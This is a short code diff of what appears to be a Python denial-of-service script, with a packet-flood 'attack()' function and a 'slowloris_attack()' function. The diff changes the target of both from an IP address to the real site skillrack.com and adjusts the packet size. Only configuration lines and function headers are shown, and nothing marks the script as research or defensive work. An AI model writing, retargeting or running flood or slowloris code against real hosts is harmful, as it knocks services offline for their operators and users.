@@ -3,9 +3,9 @@ import time
 import threading
 
 def attack():  
-    target_ip = "13.232.128.212"
+    target_ip = "skillrack.com"
 
-    packet_size = 80000
+    packet_size = 70000
 
     packet = os.urandom(packet_size)
 
@@ -37,7 +37,7 @@ import threading
 import time
 
 # Configuration  # Replace with the target IP address
-target_ip = "13.232.128.212"
+target_ip = "skillrack.com"
 target_port = 80  # Replace with the target port
 
 def slowloris_attack():
